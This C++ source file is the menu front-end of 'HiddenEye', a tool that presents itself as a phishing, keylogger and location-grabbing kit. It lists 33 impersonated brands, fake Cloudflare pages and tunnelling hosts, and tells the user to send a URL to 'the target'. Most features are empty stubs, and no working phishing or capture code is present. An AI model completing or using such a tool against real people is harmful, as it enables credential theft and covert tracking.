#include <iostream>
#include <limits>
#include <string>
#include <thread>
#include <chrono>
#include <cmath>
#include <stdio.h>
#include <fstream>
#include <sstream>

using namespace std;

void Hidden_eye_main_menu();
void show_progress_bar(int time, const std::string &message, char symbol);
int Validator(int option, int startLimit, int endLimit);
void Hidden_eye(string prompt);
void Features_choice_menu(int option, int validate);
void Facebook(int option, bool validate);
void GetLocation(int option, bool validate);
bool agreement();
 
int main()
{

    string agree;

    ifstream agreementFile("agreement.txt");

    getline(agreementFile, agree);

    agreementFile.close();

    int int_agree;

    stringstream st_agree;
    st_agree << agree;
    st_agree >> int_agree;

    if (int_agree == 0)
    {
        bool accept = agreement();

        if (accept)
        {
            Hidden_eye_main_menu();
        }
        else
        {
            return 0;
        }
    }
    else
    {
        Hidden_eye_main_menu();
    }

    return 0;
}
void Hidden_eye_main_menu()
{
    int option;
    bool validate = true;

    // show_progress_bar(100, "Loading Hidden-Eye ...", '#');
    system("clear");
    do
    {
        std::cout << "\033[1;31m"
                  << R"(

 ██░ ██  ██ ▓█████▄ ▓█████▄ ▓█████  ███▄    █    ▓█████ ██   ██ ▓█████ 
▓██░ ██ ▓██ ▒██▀ ██▌▒██▀ ██▌▓█   ▀  ██ ▀█   █    ▓█   ▀ ▒██  ██ ▓█   ▀ 
▒██▀▀██ ▒██ ░██   █▌░██   █▌▒███   ▓██  ▀█ ██▒   ▒███    ▒██ ██ ▒███   
░▓█ ░██ ░██ ░▓█▄   ▌░▓█▄   ▌▒▓█  ▄ ▓██▒  ▐▌██▒   ▒▓█  ▄  ░ ▐██▓▒▓█  ▄ 
░▓█▒░██▓ ██ ░▒████▓ ░▒████▓ ░▒████▒▒██░   ▓██░   ░▒████▒ ░ ██▒▓░░▒████▒
 ▒ ░░▒░▒░▓   ▒▒▓  ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ▒ ▒    ░░ ▒░ ░  ██▒▒▒ ░░ ▒░ ░
 ▒ ░▒░ ░ ▒ ░ ░ ▒  ▒  ░ ▒  ▒  ░ ░  ░░ ░░   ░ ▒░    ░ ░  ░▓██ ░▒░  ░ ░  ░
 ░  ░░ ░ ▒ ░ ░ ░  ░  ░ ░  ░    ░      ░   ░ ░       ░   ▒ ▒ ░░     ░   
 ░  ░  ░ ░     ░       ░       ░  ░         ░       ░  ░░ ░        ░  ░
             ░       ░                                  ░ ░            
       
)";

        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " v 1.0.0"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;31m"
                  << "\t\t["
                  << "\033[1;37m"
                  << " by Muhammad Qazi"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;31m"
                  << "\t\t[ "
                  << "\033[1;37m"
                  << "https://github.com/muhammadqazi"
                  << "\033[1;31m"
                  << " ]\n\n";

        std::cout << "\n\033[1;31m"
                  << "[ "
                  << "\033[1;34m"
                  << "Modern Phishing Tool With Advanced Functionality"
                  << "\033[1;31m"
                  << " ]\n";
        std::cout << "\033[1;31m"
                  << "[ "
                  << "\033[1;34m"
                  << "Phising , keylogger , Information Collector , All in one Social Engineering Tool"
                  << "\033[1;31m"
                  << " ]\n\n";

        std::cout << "\033[1;31m"
                  << "--------------------------------------------------------------------------------------------------\n\n";
        std::cout << "\033[1;31m"
                  << "Phising Modules:\n\n";

        //1) Facebook
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 01"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Facebook\t\t";

        //2) Google
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 02"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Google\t\t";

        //3) LinkedIn
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 03"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " LinkedIn\n\n";

        //4) Github
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 04"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Github\t\t";

        //5) Stack Overflow
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 05"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " StackOverflow\t";

        //6) WordPress
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 06"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " WordPress\n\n";

        //7) Instagram
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 07"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Instagram\t";

        //8) Twitter
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 08"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Twitter\t\t";

        //9) Snapchat
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 09"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Snapchat\n\n";

        //10) Yahoo
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 10"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Yahoo\t\t";

        //11) Twitch
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 11"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Twitch\t\t";

        //12) Microsoft
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 12"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Microsoft\n\n";

        //13) Steam
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 13"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Steam\t\t";

        //14) iCloud
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 14"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " iCloud\t\t";

        //15) GitLab
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 15"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " GitLab\n\n";

        //16) Netflix
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 16"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Netflix\t\t";

        //17) Pinterest
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 17"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Pinterest\t";

        //18) Origin
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 18"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Origin\n\n";

        //19) ProtoMail
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 19"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " ProtoMail\t";

        //20) Spotify
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 20"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Spotify\t\t";

        //21) Quora
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 21"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Quora\n\n";

        //22) Adobe
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 22"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Adobe\t\t";

        //23) Cryptocurrency
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 23"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Cryptocurrency\t";

        //24) DevianArt
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 24"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " DevianArt\n\n";

        //25) Dropbox
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 25"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Dropbox\t\t";

        //26) eBay
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 26"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " eBay\t\t";

        //27) PayPal
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 27"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " PayPal\n\n";

        //28) Shopify
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 28"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Shopify\t\t";

        //29) Verizon
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 29"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Verizon\t\t";

        //30) Reddit
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 30"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Reddit\n\n";

        //31) PlayStation
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 31"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " PlayStation\t";

        //32) Xbox
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 32"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Xbox\t\t";

        //33) Custom
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 33"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Custom(1)\n\n";

        std::cout << "\033[1;31m"
                  << "Additional Tools:\n\n";
        // 34) Location
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 34"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Get Target Location\n\n";

        if (!validate)
        {
            std::cout << "\033[1;31m"
                         "Enter the correct option\n"
                      << endl;
        }

        std::cout << "\033[1;31m"
                  << "HiddenEye >> "
                  << "\033[1;37m";
        std::cin >> option;

        validate = Validator(option, 1, 34);

        if (validate)
        {
            system("clear");

            //1) Facebook
            if (option == 1)
            {
                Facebook(option, validate);
            }
            //2) Google
            if (option == 2)
            {
                Facebook(option, validate);
            }
            //3) Linkedin
            else if (option == 3)
            {
                Features_choice_menu(option, validate);
            }
            //4) Github
            else if (option == 4)
            {
                Features_choice_menu(option, validate);
            }
            //5) StackOverflow
            else if (option == 5)
            {
                Features_choice_menu(option, validate);
            }
            //6) Wordpress
            else if (option == 6)
            {
                Features_choice_menu(option, validate);
            }
            //7) Instagram
            else if (option == 7)
            {
                Features_choice_menu(option, validate);
            }
            //8) Twitter
            else if (option == 8)
            {
                Features_choice_menu(option, validate);
            }
            //9) Snapchat
            else if (option == 9)
            {
                Features_choice_menu(option, validate);
            }
            //10) Yahoo
            else if (option == 10)
            {
                Features_choice_menu(option, validate);
            }
            //11) Twitch
            else if (option == 11)
            {
                Features_choice_menu(option, validate);
            }
            //12) Microsoft
            else if (option == 12)
            {
                Features_choice_menu(option, validate);
            }
            //13) Steam
            else if (option == 13)
            {
                Features_choice_menu(option, validate);
            }
            //14) iCloud
            else if (option == 14)
            {
                Features_choice_menu(option, validate);
            }
            //15) Gitlab
            else if (option == 15)
            {
                Features_choice_menu(option, validate);
            }
            //16) Netflix
            else if (option == 16)
            {
                Features_choice_menu(option, validate);
            }
            //17) Pinterest
            else if (option == 17)
            {
                Features_choice_menu(option, validate);
            }
            //18) Origin
            else if (option == 18)
            {
                Features_choice_menu(option, validate);
            }
            //19) ProtonMail
            else if (option == 19)
            {
                Features_choice_menu(option, validate);
            }
            //20) Spotify
            else if (option == 20)
            {
                Features_choice_menu(option, validate);
            }
            //21) Quora
            else if (option == 21)
            {
                Features_choice_menu(option, validate);
            }
            //22) Adobe
            else if (option == 22)
            {
                Features_choice_menu(option, validate);
            }
            //23) CryptoCurrency
            else if (option == 23)
            {
                Features_choice_menu(option, validate);
            }
            //24) DebianArt
            else if (option == 24)
            {
                Features_choice_menu(option, validate);
            }
            //25) DropBox
            else if (option == 25)
            {
                Features_choice_menu(option, validate);
            }
            //26) eBay
            else if (option == 26)
            {
                Features_choice_menu(option, validate);
            }
            //27) Paypal
            else if (option == 27)
            {
                Features_choice_menu(option, validate);
            }
            //28) Spotify
            else if (option == 28)
            {
                Features_choice_menu(option, validate);
            }
            //29) Verizon
            else if (option == 29)
            {
                Features_choice_menu(option, validate);
            }
            //30) Reddit
            else if (option == 30)
            {
                Features_choice_menu(option, validate);
            }
            //31) PlayStation
            else if (option == 31)
            {
                Features_choice_menu(option, validate);
            }
            //32) Xbox
            else if (option == 32)
            {
                Features_choice_menu(option, validate);
            }
            //33) Custom
            else if (option == 33)
            {
                Features_choice_menu(option, validate);
            }
            //34) Get Location
            else if (option == 34)
            {
                GetLocation(option, validate);
            }
        }

    } while (!validate);
}
int Validator(int option, int startLimit, int endLimit)
{
    if ((option <= startLimit || option <= endLimit) && (option != 0))
    {
        return true;
    }
    else
    {
        std::cin.clear();
        std::cin.ignore(numeric_limits<streamsize>::max(), '\n');
        return false;
    }
}
void show_progress_bar(int time, const std::string &message, char symbol)
{
    std::string progress_bar;
    const double progress_level = 1.42;

    std::cout << "\n\033[1;31m" << message << "\n\n";

    for (double percentage = 0; percentage <= 100; percentage += progress_level)
    {
        progress_bar.insert(0, 1, symbol);
        std::cout << "\033[1;31m"
                  << "\r [ "
                  << "\033[1;37m" << std::ceil(percentage) << '%' << "\033[1;31m"
                  << " ] " << progress_bar;
        std::this_thread::sleep_for(std::chrono::milliseconds(time));
    }
    std::cout << "\n\n";
}
void Facebook(int option, bool validate)
{
    std::cout << "\033[1;31m"
              << "["
              << "\033[1;37m"
              << " *"
              << "\033[1;31m"
              << " ]"
              << "\033[1;37m"
              << " Facebook Phishing is loaded\n\n";

    std::cout << "\033[1;31m"
              << "["
              << "\033[1;37m"
              << " *"
              << "\033[1;31m"
              << " ]"
              << "\033[1;37m"
              << " Select Mode\n\n";

    std::cout << "\033[1;31m"
              << "--------------------------------------------------------------------------------------------------\n\n";

    std::cout << "\033[1;31m"
              << "Operation Mode:\n\n";
    do
    {
        //1) Standard
        std::cout << "\n\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 01"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Standard Phising Page\t\t";
        //2) Fake Security
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 02"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Fake Security\n\n";
        //3) Poll Ranking
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 03"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Poll Ranking Method\t\t";
        //4) Poll Mesenger Credentials
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 04"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Poll Messenger Credentials\n\n";

        if (!validate)
        {
            std::cout << "\033[1;31m"
                         "Enter the correct option\n\n"
                      << endl;
        }

        std::cout << "\033[1;31m"
                  << "HiddenEye >> "
                  << "\033[1;37m";
        std::cin >> option;

        validate = Validator(option, 1, 4);

        if (validate)
        {
            system("clear");

            //1) Standard Phising Page
            if (option == 1)
            {

                Hidden_eye("Prompt : Chose Features you would like to chose");

                std::cout << "\033[1;31m"
                          << "Operation Mode:\n\n";

                Features_choice_menu(option, validate);
            }
            //2) Fake Security
            else if (option == 2)
            {
                std::cout << option;
            }
            //3) Poll Ranking
            else if (option == 3)
            {
                std::cout << option;
            }
            //4) Poll Mesenger Credentials
            else if (option == 4)
            {
                std::cout << option;
            }
        }

    } while (!validate);
}
void GetLocation(int option, bool validate)
{
    std::cout << "\033[1;31m"
              << "["
              << "\033[1;37m"
              << " *"
              << "\033[1;31m"
              << " ]"
              << "\033[1;37m"
              << " Location Module is loaded\n\n";

    std::cout << "\033[1;31m"
              << "["
              << "\033[1;37m"
              << " *"
              << "\033[1;31m"
              << " ]"
              << "\033[1;37m"
              << " Select Mode\n\n";

    std::cout << "\033[1;31m"
              << "--------------------------------------------------------------------------------------------------\n\n";

    std::cout << "\033[1;31m"
              << "Operation Mode:\n\n";

    do
    {

        //1) Near you
        std::cout << "\n\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 01"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " NearYou (Webpage looks like legitimate)\t\t";
        //2) GoDrive
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 02"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " GoDrive (Ask for user permission on redirect to GoDrive)\n\n";

        if (!validate)
        {
            std::cout << "\033[1;31m"
                         "Enter the correct option\n\n"
                      << endl;
        }

        std::cout << "\033[1;31m"
                  << "HiddenEye >> "
                  << "\033[1;37m";
        std::cin >> option;

        validate = Validator(option, 1, 2);

        if (validate)
        {
            if (option == 1)
            {
                system("clear");

                std::cout << "\033[1;31m"
                          << "["
                          << "\033[1;37m"
                          << " *"
                          << "\033[1;31m"
                          << " ]"
                          << "\033[1;37m"
                          << " Please use Tunnels/URL with "
                          << "\033[1;31m"
                          << "'https'" << std::endl
                          << std::endl;

                std::cout << "\033[1;31m"
                          << "["
                          << "\033[1;37m"
                          << " *"
                          << "\033[1;31m"
                          << " ]"
                          << "\033[1;37m"
                          << " Browser trusts only with "
                          << "\033[1;31m"
                          << "'https' "
                          << "\033[1;37m"
                          << "links" << std::endl
                          << std::endl;

                std::cout << "If you have setup files correctly "
                          << "\033[1;31m"
                          << "Press ENTER to continue ...";
                std::cin.get();
                std::cin.ignore();

                system("clear");

                Features_choice_menu(option, validate);
            }
            else if (option == 2)
            {
                system("clear");

                std::cout << "\033[1;31m"
                          << "["
                          << "\033[1;37m"
                          << " *"
                          << "\033[1;31m"
                          << " ]"
                          << "\033[1;37m"
                          << " Please use Tunnels/URL with "
                          << "\033[1;31m"
                          << "'https'" << std::endl
                          << std::endl;

                std::cout << "\033[1;31m"
                          << "["
                          << "\033[1;37m"
                          << " *"
                          << "\033[1;31m"
                          << " ]"
                          << "\033[1;37m"
                          << " Browser trusts only with "
                          << "\033[1;31m"
                          << "'https' "
                          << "\033[1;37m"
                          << "links" << std::endl
                          << std::endl;

                std::cout << "\033[1;31m"
                          << "["
                          << "\033[1;37m"
                          << " *"
                          << "\033[1;31m"
                          << " ]"

                          << "\033[1;31m"
                          << " Tip :"
                          << "\033[1;37m"
                          << " Use Google Drive File URL as custom URL while asked\n"
                          << std::endl;

                std::cout << "If you have setup files correctly "
                          << "\033[1;31m"
                          << "Press ENTER to continue ...";
                std::cin.get();
                std::cin.ignore();

                system("clear");

                Features_choice_menu(option, validate);
            }
        }

    } while (!validate);
}
void Features_choice_menu(int option, int validate)
{
    do
    {
        //1) Keylogger
        std::cout << "\n\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 01"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Keylogger\n\n";
        //2) Fake CloudFare Protection Page
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 02"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Fake CloudFare Protection Page\n\n";
        //3) Capture Data Email
        std::cout << "\033[1;31m"
                  << "["
                  << "\033[1;37m"
                  << " 03"
                  << "\033[1;31m"
                  << " ]"
                  << "\033[1;37m"
                  << " Capture Data Email\n\n";

        if (!validate)
        {
            std::cout << "\033[1;31m"
                         "Enter the correct option\n\n"
                      << endl;
        }

        std::cout << "\033[1;31m"
                  << "HiddenEye >> "
                  << "\033[1;37m";
        std::cin >> option;

        validate = Validator(option, 1, 3);

        if (validate)
        {
            system("clear");

            //1) Keylogger
            if (option == 1)
            {
                std::cout << option;
            }
            //2) Fake CloudFare Protection Page
            else if (option == 2)
            {
                // show_progress_bar(100, "Loading Fake CloudFare Modules ...", '*');

                Hidden_eye("Prompt : Put your redirect URL here");

                std::cout << "\033[1;31m"
                          << "["
                          << "\033[1;37m"
                          << " *"
                          << "\033[1;31m"
                          << " ]"
                          << "\033[1;37m"
                          << " Insert a custom redirect URL\n\n";

                std::cout << "\033[1;31m"
                          << " Redirect URL >> "
                          << "\033[1;37m";

                string redirect_url;

                std::cin >> redirect_url;

                Hidden_eye("Prompt : Web Server Port Selection");

                std::cout << "\033[1;31m"
                          << "["
                          << "\033[1;37m"
                          << " *"
                          << "\033[1;31m"
                          << " ]"
                          << "\033[1;37m"
                          << " Select Port [1-65535]\n\n";

                std::cout << "\033[1;31m"
                          << "["
                          << "\033[1;37m"
                          << " *"
                          << "\033[1;31m"
                          << " ]"
                          << "\033[1;37m"
                          << " We suggest using ports between [1024-65535] but you still able to choose any ports you want.\n\n";

                std::cout << "\033[1;31m"
                          << "["
                          << "\033[1;37m"
                          << " *"
                          << "\033[1;31m"
                          << " ]"
                          << "\033[1;37m"
                          << " In case of Ngrok use the port you set for Ngrok\n\n";

                std::cout << "\033[1;31m"
                          << " Redirect Port >> "
                          << "\033[1;37m";

                int port;

                std::cin >> port;

                Hidden_eye("Prompt : Hosting Server Selection");

                std::cout << "\033[1;31m"
                          << "["
                          << "\033[1;37m"
                          << " *"
                          << "\033[1;31m"
                          << " ]"
                          << "\033[1;37m"
                          << " Selecy any availible server\n\n";
                do
                {
                    //1) localhost
                    std::cout << "\033[1;31m"
                              << "["
                              << "\033[1;37m"
                              << " 01"
                              << "\033[1;31m"
                              << " ]"
                              << "\033[1;37m"
                              << " Localhost\t\t\t\t";

                    //2) Ngrok
                    std::cout << "\033[1;31m"
                              << "["
                              << "\033[1;37m"
                              << " 02"
                              << "\033[1;31m"
                              << " ]"
                              << "\033[1;37m"
                              << " Ngrok\n\n";

                    //3) Serveo
                    std::cout << "\033[1;31m"
                              << "["
                              << "\033[1;37m"
                              << " 03"
                              << "\033[1;31m"
                              << " ]"
                              << "\033[1;37m"
                              << " Serveo\t\t\t\t\t";

                    //4) Localxpose
                    std::cout << "\033[1;31m"
                              << "["
                              << "\033[1;37m"
                              << " 04"
                              << "\033[1;31m"
                              << " ]"
                              << "\033[1;37m"
                              << " Localxpose\n\n";

                    //5) localTunnel
                    std::cout << "\033[1;31m"
                              << "["
                              << "\033[1;37m"
                              << " 05"
                              << "\033[1;31m"
                              << " ]"
                              << "\033[1;37m"
                              << " Localtunnel\t\t\t\t";

                    //6) OpenPort
                    std::cout << "\033[1;31m"
                              << "["
                              << "\033[1;37m"
                              << " 06"
                              << "\033[1;31m"
                              << " ]"
                              << "\033[1;37m"
                              << " OpenPort\n\n";

                    //7) PageKite
                    std::cout << "\033[1;31m"
                              << "["
                              << "\033[1;37m"
                              << " 07"
                              << "\033[1;31m"
                              << " ]"
                              << "\033[1;37m"
                              << " PageKite\n\n";

                    if (!validate)
                    {
                        std::cout << "\033[1;31m"
                                     "Enter the correct option\n\n"
                                  << endl;
                    }

                    std::cout << "\033[1;31m"
                              << "HiddenEye >> "
                              << "\033[1;37m";
                    std::cin >> option;

                    validate = Validator(option, 1, 7);

                    if (validate)
                    {
                        //1) localhost
                        if (option == 1)
                        {

                            Hidden_eye("Prompt : Running Localhost server");

                            std::cout << "\033[1;31m"
                                      << "["
                                      << "\033[1;37m"
                                      << " *"
                                      << "\033[1;31m"
                                      << " ]"
                                      << "\033[1;37m"
                                      << " Send this URL to the target on the same nertwork\n\n";

                            std::cout << "\033[1;31m"
                                      << "["
                                      << "\033[1;37m"
                                      << " *"
                                      << "\033[1;31m"
                                      << " ]"
                                      << "\033[1;32m"
                                      << " Localhost URL : https://localhost:" << port << "\n\n";

                            std::cout << "\033[1;31m"
                                      << "["
                                      << "\033[1;37m"
                                      << " *"
                                      << "\033[1;31m"
                                      << " ]"
                                      << "\033[1;37m"
                                      << " Server is Listening to Port :" << port << " Waitinng for the target interaction\n\n";
                        }
                        //2) Ngrok
                        else if (option == 2)
                        {
                            std::cout << option;
                        }
                        //3) Serveo
                        else if (option == 3)
                        {
                            std::cout << option;
                        }
                        //4) Localxpose
                        else if (option == 4)
                        {
                            std::cout << option;
                        }
                        //5) localTunnel
                        else if (option == 5)
                        {
                            std::cout << option;
                        }
                        //6) OpenPort
                        else if (option == 6)
                        {
                            std::cout << option;
                        }
                        //7) PakeKite
                        else if (option == 7)
                        {
                            std::cout << option;
                        }
                    }

                } while (!validate);
            }
            //3) Capture Data Email
            else if (option == 3)
            {
                std::cout << option;
            }
        }

    } while (!validate);
}
bool agreement()
{
    std::cout << "\033[1;31m"
              << R"(

 ██░ ██  ██ ▓█████▄ ▓█████▄ ▓█████  ███▄    █    ▓█████ ██   ██ ▓█████ 
▓██░ ██ ▓██ ▒██▀ ██▌▒██▀ ██▌▓█   ▀  ██ ▀█   █    ▓█   ▀ ▒██  ██ ▓█   ▀ 
▒██▀▀██ ▒██ ░██   █▌░██   █▌▒███   ▓██  ▀█ ██▒   ▒███    ▒██ ██ ▒███   
░▓█ ░██ ░██ ░▓█▄   ▌░▓█▄   ▌▒▓█  ▄ ▓██▒  ▐▌██▒   ▒▓█  ▄  ░ ▐██▓▒▓█  ▄ 
░▓█▒░██▓ ██ ░▒████▓ ░▒████▓ ░▒████▒▒██░   ▓██░   ░▒████▒ ░ ██▒▓░░▒████▒
 ▒ ░░▒░▒░▓   ▒▒▓  ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ▒ ▒    ░░ ▒░ ░  ██▒▒▒ ░░ ▒░ ░
 ▒ ░▒░ ░ ▒ ░ ░ ▒  ▒  ░ ▒  ▒  ░ ░  ░░ ░░   ░ ▒░    ░ ░  ░▓██ ░▒░  ░ ░  ░
 ░  ░░ ░ ▒ ░ ░ ░  ░  ░ ░  ░    ░      ░   ░ ░       ░   ▒ ▒ ░░     ░   
 ░  ░  ░ ░     ░       ░       ░  ░         ░       ░  ░░ ░        ░  ░
             ░       ░                                  ░ ░            
       
)";

    std::cout << "\n\033[1;31m"
              << "\t\t\t\t[ "
              << "\033[1;37m"
              << "DISCLAIMER AND USER AGREEMENT"
              << "\033[1;31m"
              << " ]\n\n";

    std::cout << "\033[1;37m"
              << "The use of the HiddenEye & its resources/phishing-pages is "
              << "\033[1;31m"
              << "COMPLETE RESPONSIBILITY"
              << "\033[1;37m"
              << " of the END-USER. \nDevelopers assume NO liability and are NOT responsible for any misuse or damage caused by this program. \nAlso we inform you that some of your your actions may be"
              << "\033[1;31m"
              << " ILLEGAL"
              << "\033[1;37m"
              << " and you "
              << "\033[1;31m"
              << "CAN NOT "
              << "\033[1;37m"
              << "use this software to test\nperson or company without "
              << "\033[1;31m"
              << "WRITTEN PERMISSION "
              << "\033[1;37m"
              << "from them.\n\n";

    // agreement
    std::cout << "\033[1;31m"
              << "By typing Yes you agree with the terms and conditions and you taking the responsibility of any damage made by the action using this tool.\n";

    std::cout << "\033[1;31m"
              << "\nType" << "\033[1;32m" << " Y "<< "\033[1;31m"<<" to continue and " << "\033[1;32m" << " N "<< "\033[1;31m"<<"to exit the program\n";
    char answer;
    std::cout << "\033[1;37m"
              << "\nContinue: ";
    std::cin >> answer;
    if (answer == 'Y' || answer == 'y')
    {
        ofstream myfile;
        myfile.open("agreement.txt");
        myfile << 1;
        return true;
    }
    else
    {
        return false;
    }
}
void Hidden_eye(string prompt)
{
    system("clear");

    std::cout << "\033[1;31m"
              << R"(
 _  _  __  ____  ____  ____  __ _       ____  _  _  ____ 
/ )( \(  )(    \(    \(  __)(  ( \     (  __)( \/ )(  __)
) __ ( )(  ) D ( ) D ( ) _) /    /      ) _)  )  /  ) _)    by Muhammad Qazi
\_)(_/(__)(____/(____/(____)\_)__)     (____)(__/  (____)

                          https://github.com/muhammadqazi
            )" << endl;

    std::cout << "\n\033[1;31m"
              << "[ "
              << "\033[1;34m"
              << prompt
              << "\033[1;31m"
              << " ]\n\n";

    std::cout << "\033[1;31m"
              << "--------------------------------------------------------------------------------------------------\n\n";
}